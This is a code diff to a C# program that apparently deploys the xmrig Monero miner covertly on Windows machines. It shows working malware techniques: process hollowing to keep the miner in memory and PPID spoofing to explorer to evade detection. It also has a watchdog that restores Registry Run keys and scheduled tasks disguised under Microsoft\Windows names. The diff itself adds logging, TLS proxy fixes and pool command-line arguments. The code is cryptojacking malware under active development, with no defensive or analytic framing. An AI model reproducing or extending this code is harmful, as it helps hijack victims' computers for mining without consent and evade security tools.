@@ -139,8 +139,11 @@ internal class Program
     [DllImport("user32.dll")]
     private static extern nint DispatchMessageW(ref MSG msg);
 
-    [System.Diagnostics.Conditional("DEBUG")]
-    private static void Log(string msg) { }
+    private static readonly string _logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "miner_debug.log");
+    private static void Log(string msg)
+    {
+        try { System.IO.File.AppendAllText(_logPath, $"[{DateTime.Now:HH:mm:ss.fff}] {msg}\n"); } catch { }
+    }
 
 
     // ── x64 CONTEXT offsets ───────────────────────────────────────────────────
@@ -431,9 +434,6 @@ internal class Program
         else if (MinerConfig.EnableHollowing)
             Log($"Hollowing mode — xmrig stays in memory ({(_xmrigBytes?.Length ?? 0)} bytes)");
 
-        WriteConfig(cfgPath, MinerConfig.MaxCpuIdle);
-        Log($"Config written: {cfgPath}");
-
         if (MinerConfig.EnableStartup)
         {
             // Always copy the stub (not xmrig) to the install path so the scheduled task
@@ -471,9 +471,18 @@ internal class Program
 
         if (MinerConfig.PoolTls)
         {
-            // Detect if xmrig has native OpenSSL — if so, use it directly (no proxy needed)
-            if (!MinerConfig.EnableHollowing && File.Exists(xmrigExe))
+            Log("PoolTls block entered");
+            // Hollowing mode: xmrig is in _xmrigBytes — scan bytes for OpenSSL marker
+            if (MinerConfig.EnableHollowing && (_xmrigBytes?.Length ?? 0) > 0)
+            {
+                _xmrigHasOpenSsl = _xmrigBytes!.AsSpan().IndexOf("OpenSSL"u8) >= 0;
+                Log($"OpenSSL scan (memory): {_xmrigHasOpenSsl}");
+            }
+            else if (!MinerConfig.EnableHollowing && File.Exists(xmrigExe))
+            {
                 _xmrigHasOpenSsl = DetectXmrigOpenSsl(xmrigExe);
+                Log($"OpenSSL scan (file): {_xmrigHasOpenSsl}");
+            }
 
             if (_xmrigHasOpenSsl)
             {
@@ -481,15 +490,24 @@ internal class Program
             }
             else
             {
-                // Fallback: loopback TLS-terminating proxy for xmrig builds without OpenSSL
-                var rawUrl  = MinerConfig.PoolUrl;
+                var rawUrl   = MinerConfig.PoolUrl;
                 var colonIdx = rawUrl.LastIndexOf(':');
-                var tlsHost = colonIdx > 0 ? rawUrl[..colonIdx] : rawUrl;
-                var tlsPort = colonIdx > 0 && int.TryParse(rawUrl[(colonIdx + 1)..], out int p) ? p : 14433;
-                _tlsProxyPort = StartTlsProxy(tlsHost, tlsPort);
-                Log($"TLS proxy started on 127.0.0.1:{_tlsProxyPort} -> {tlsHost}:{tlsPort}");
+                var tlsHost  = colonIdx > 0 ? rawUrl[..colonIdx] : rawUrl;
+                var tlsPort  = colonIdx > 0 && int.TryParse(rawUrl[(colonIdx + 1)..], out int p) ? p : 14433;
+                try
+                {
+                    _tlsProxyPort = StartTlsProxy(tlsHost, tlsPort);
+                    Log($"TLS proxy started on 127.0.0.1:{_tlsProxyPort} -> {tlsHost}:{tlsPort}");
+                }
+                catch (Exception ex)
+                {
+                    Log($"TLS proxy FAILED: {ex.GetType().Name}: {ex.Message}");
+                }
             }
         }
+
+        WriteConfig(cfgPath, MinerConfig.MaxCpuIdle);
+        Log($"Config written: {cfgPath}");
 
         if (!string.IsNullOrEmpty(MinerConfig.StatsUrl))
             _ = Task.Run(StatsReporterAsync);
@@ -712,41 +730,47 @@ internal class Program
                 ? MinerConfig.InstallName[..^4] : MinerConfig.InstallName;
             var cfgPath = Path.Combine(Path.GetDirectoryName(stubExe)!, "config.json");
 
-            // Registry Run key — restore if missing (no visible window, instant)
-            const uint KEY_READ      = 0x20019;
-            const uint KEY_SET_VALUE = 0x0002;
-            const uint REG_SZ        = 1;
-            var        HKCU          = new nint(unchecked((int)0x80000001u));
-            if (RegOpenKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-                    0, KEY_READ, out var hkCheck) == 0)
+            // Registry Run key — restore if missing (only when EnableStartup is on)
+            if (MinerConfig.EnableStartup)
             {
-                uint type = 0, cb = 0;
-                bool missing = RegQueryValueExW(hkCheck, folderName, 0, out type, null, ref cb) != 0;
-                RegCloseKey(hkCheck);
-                if (missing)
+                const uint KEY_READ      = 0x20019;
+                const uint KEY_SET_VALUE = 0x0002;
+                const uint REG_SZ        = 1;
+                var        HKCU          = new nint(unchecked((int)0x80000001u));
+                if (RegOpenKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+                        0, KEY_READ, out var hkCheck) == 0)
                 {
-                    if (RegCreateKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-                            0, 0, 0, KEY_SET_VALUE, 0, out var hkRun, out _) == 0)
+                    uint type = 0, cb = 0;
+                    bool missing = RegQueryValueExW(hkCheck, folderName, 0, out type, null, ref cb) != 0;
+                    RegCloseKey(hkCheck);
+                    if (missing)
                     {
-                        var val = System.Text.Encoding.Unicode.GetBytes($"\"{stubExe}\" --config=\"{cfgPath}\"\0");
-                        RegSetValueExW(hkRun, folderName, 0, REG_SZ, val, (uint)val.Length);
-                        RegCloseKey(hkRun);
-                        Log("Watchdog: Run key restored");
+                        if (RegCreateKeyExW(HKCU, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+                                0, 0, 0, KEY_SET_VALUE, 0, out var hkRun, out _) == 0)
+                        {
+                            var val = System.Text.Encoding.Unicode.GetBytes($"\"{stubExe}\" --config=\"{cfgPath}\"\0");
+                            RegSetValueExW(hkRun, folderName, 0, REG_SZ, val, (uint)val.Length);
+                            RegCloseKey(hkRun);
+                            Log("Watchdog: Run key restored");
+                        }
                     }
                 }
             }
 
-            // Scheduled tasks — restore if missing (spawns schtasks.exe, brief flash, once per minute max)
+            // Scheduled tasks — restore if missing, but only when EnableStartup is on
             bool taskMissing = false;
-            try
+            if (MinerConfig.EnableStartup)
             {
-                using var qp = Process.Start(new ProcessStartInfo("schtasks",
-                    $"/query /tn \"Microsoft\\Windows\\{folderName}\"")
-                { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true });
-                qp?.WaitForExit(5000);
-                taskMissing = qp?.ExitCode != 0;
+                try
+                {
+                    using var qp = Process.Start(new ProcessStartInfo("schtasks",
+                        $"/query /tn \"Microsoft\\Windows\\{folderName}\"")
+                    { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true });
+                    qp?.WaitForExit(5000);
+                    taskMissing = qp?.ExitCode != 0;
+                }
+                catch { taskMissing = true; }
             }
-            catch { taskMissing = true; }
 
             if (taskMissing)
             {
@@ -818,10 +842,18 @@ internal class Program
                 ref viewSz, 2u, 0, 0x20u);
 
             // 4. CreateProcess(target) SUSPENDED — PPID spoof to explorer (breaks suspicious parent-child chain)
+            var user = !string.IsNullOrEmpty(MinerConfig.WorkerName)
+                ? $"{MinerConfig.Wallet}.{MinerConfig.WorkerName}" : MinerConfig.Wallet;
+            var pass = !string.IsNullOrEmpty(MinerConfig.Password) ? MinerConfig.Password : "x";
             string cmdLine = $"\"{target}\"" +
-                $" --config=\"{cfgPath}\"" +
+                $" -o \"{MinerConfig.PoolUrl}\"" +
+                $" -u \"{user}\" -p \"{pass}\"" +
+                $" -a \"{MinerConfig.Algo}\"" +
+                (MinerConfig.PoolTls ? " --tls" : "") +
                 $" --no-color --donate-level=0" +
-                $" --cpu-max-threads-hint={cpuHint}";
+                $" --cpu-max-threads-hint={cpuHint}" +
+                $" --randomx-no-rdmsr" +
+                $" --http-host=127.0.0.1 --http-port=18080";
             if (_internalApiPort > 0)
                 cmdLine += $" --http-host=127.0.0.1 --http-port={_internalApiPort}";
             string hollowWorkDir = Path.GetDirectoryName(cfgPath) ?? "";
@@ -933,6 +965,7 @@ internal class Program
   ""cpu"": {{ ""enabled"": true, ""max-threads-hint"": {cpuHint} }},
   ""pools"": [{{ ""url"": ""{Js(_xmrigHasOpenSsl ? MinerConfig.PoolUrl : (MinerConfig.PoolTls && _tlsProxyPort > 0 ? $"127.0.0.1:{_tlsProxyPort}" : MinerConfig.PoolUrl))}"", ""user"": ""{Js(!string.IsNullOrEmpty(MinerConfig.WorkerName) ? $"{MinerConfig.Wallet}.{MinerConfig.WorkerName}" : MinerConfig.Wallet)}"", ""pass"": ""{Js(!string.IsNullOrEmpty(MinerConfig.Password) ? MinerConfig.Password : "x")}"", ""tls"": {(MinerConfig.PoolTls && _xmrigHasOpenSsl ? "true" : "false")} }}],
   ""algo"": ""{Js(MinerConfig.Algo)}"",
+  ""coin"": ""monero"",
   ""print-time"": 0,
   {apiSection}
 }}");
